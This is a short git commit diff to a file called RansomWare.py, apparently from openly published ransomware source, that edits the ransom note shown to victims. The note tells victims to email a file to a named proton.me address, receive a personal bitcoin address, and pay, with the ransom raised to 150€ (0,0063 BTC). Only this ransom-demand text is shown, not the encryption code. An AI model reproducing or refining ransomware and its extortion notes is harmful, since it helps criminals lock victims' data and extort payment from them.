04c96cdd00c1a669fe55f24fd39c89d0bcd04491
suchejxwc <141152747+suchejxwc@users.noreply.github.com>
2023-08-21 23:18:51 +0300

    Update RansomWare.py

--- RansomWare.py
+++ RansomWare.py
@@ -171,7 +171,7 @@ To purchase your key and restore your data, please follow these three easy steps
 
 1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to kowqer@proton.me
 
-2. You will recieve your personal BTC address for payment (0,000042 BTC).
+2. You will recieve your personal BTC address for payment, 150€ in bitcoins!(0,0063 BTC)
    Once payment has been completed, send another email to kowqer@proton.me stating "PAID".
    We will check to see if payment has been paid.
 
